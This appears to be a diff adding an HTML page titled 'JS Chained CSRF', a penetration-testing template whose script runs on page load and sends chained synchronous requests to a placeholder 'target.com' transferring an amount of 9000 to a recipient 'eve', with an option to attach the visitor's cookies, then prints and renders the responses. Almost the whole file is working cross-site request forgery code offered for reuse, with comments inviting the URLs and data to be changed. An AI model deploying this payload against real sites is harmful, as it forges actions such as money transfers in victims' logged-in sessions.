@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>JS Chained CSRF</title>
+		<meta name="author" content="Ivan Šincek">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<style>
+			pre {
+				white-space: pre-wrap;
+			}
+		</style>
+	</head>
+	<body>
+		<script>
+			var count = 0;
+			function send(obj) {
+				var xhr = new XMLHttpRequest();
+				xhr.open(obj.method, obj.url, false); // sync
+				// find out more about forbidden HTTP request headers at https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name
+				if (obj.headers) {
+					Object.keys(obj.headers).forEach(function(key) {
+						xhr.setRequestHeader(key, obj.headers[key]);
+					});
+				}
+				if (obj.credentials) {
+					xhr.withCredentials = true;
+				}
+				// no exception handling on send()
+				xhr.send(obj.data);
+				var data = {id: ++count, request: obj, response: {headers: null, body: {raw: null, text: null}}};
+				if (xhr.readyState == 4 && xhr.status >= 200 && xhr.status < 400) {
+					data.response.headers = xhr.getAllResponseHeaders();
+					data.response.body.raw = xhr.response;
+					data.response.body.text = xhr.responseText;
+				} else if (xhr.readyState == 4) {
+					console.error('Error:', {id: data.id, status: xhr.status, text: xhr.statusText});
+				}
+				return data;
+			}
+			// ----------------------------------------
+			function print(data) {
+				var pre = document.createElement('pre');
+				pre.setAttribute('id', 'print-' + data.id);
+				pre.innerHTML = '---------- RESPONSE ' + data.id + ' ----------\r\n' + data.response.headers + '\r\n' + data.response.body.text + '\r\n';
+				document.body.appendChild(pre);
+			}
+			function render(data) {
+				// try to render the response in <iframe>
+				var iframe = document.createElement('iframe');
+				iframe.setAttribute('id', 'render-' + data.id);
+				iframe.width = '400px';
+				iframe.height = '400px';
+				iframe.srcdoc = data.response.body.text;
+				document.body.appendChild(iframe);
+			}
+			var response = null;
+			// ----------------------------------------
+			// change the URLs, HTTP methods, HTTP request headers, data, etc. as necessary
+			// requests/responses can be chained together in a row, requests are executed synchronously
+			// use 'window.onload' event if you must wait for the web form to fully render/load
+			response = send({
+				url: 'http://target.com',
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/x-www-form-urlencoded'
+				},
+				data: 'recipient=eve&amount=9000',
+				credentials: false
+			});
+			print(response);
+			// do something with the response here
+			// ----------------------------------------
+			response = send({
+				url: 'http://target.com',
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json'
+				},
+				data: JSON.stringify({
+					recipient: 'eve',
+					amount: 9000
+				}),
+				credentials: false
+			});
+			print(response);
+			// do something with the response here
+			// ----------------------------------------
+			response = send({
+				url: 'http://target.com?recipient=eve&amount=9000',
+				method: 'GET',
+				credentials: false
+			});
+			print(response);
+			render(response);
+			// do something with the response here
+		</script>
+	</body>
+</html>
